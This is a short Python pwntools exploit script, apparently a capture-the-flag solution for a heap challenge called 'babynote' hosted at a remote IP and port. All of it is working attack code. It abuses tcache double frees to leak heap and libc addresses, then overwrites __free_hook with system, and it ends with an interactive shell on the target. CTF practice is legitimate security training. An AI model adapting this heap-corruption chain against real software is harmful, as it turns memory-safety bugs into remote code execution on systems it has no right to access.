from pwn import *

# p = process('./babynote')
p = remote('140.112.31.97', 30203)
elf = ELF('./babynote')
libc = elf.libc

def create(size, content):
    p.sendafter('>', '1')
    p.sendafter('size : ', str(size))
    p.sendafter('Content : ', content)

def show(index):
    p.sendafter('>', '2')
    p.sendafter('index : ', str(index))

def edit(index, content):
    p.sendafter('>', '3')
    p.sendafter('index : ', str(index))
    p.sendafter('Content : ', content)

def delete(index):
    p.sendafter('>', '4')
    p.sendafter('index : ', str(index))

# double free tcache to leak heap base
create(0x18, 'a')   # 0
delete(0)
create(0x18, 'a')   # 1
delete(0)
edit(1, p64(0)+p64(0))
delete(0)
show(1)
heap = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x2a0
success('heap = 0x%x', heap)

# write fake chunk size to make fastbin look like unsorted bin and use double free fake unsorted bin to leak libc base
create(0x78, 'a')   # 2
delete(2)
create(0x78, 'a') # 3
create(0x78, p64(0)*9+p64(0x21)+p64(0)*3+p64(0x21)) # 4

edit(1, p64(heap+0x2b0)+p64(0))
create(0x18, 'a')   # 5
create(0x18, p64(0)+p64(0xd1)) # 6
for i in range(7):
    delete(2)
    edit(3, p64(0)*2)
delete(2)
show(3)
libc_base = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x1ebbe0
success('libc base = 0x%x', libc_base)

# use double free to overwrite __free_hook to system
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
delete(0)
edit(1, p64(0)+p64(0))
delete(0)
edit(1, p64(free_hook-8)+p64(0))
create(0x18, 'a')   # 7
create(0x18, b'/bin/sh\x00'+p64(system))   # 8
delete(8)

p.interactive()
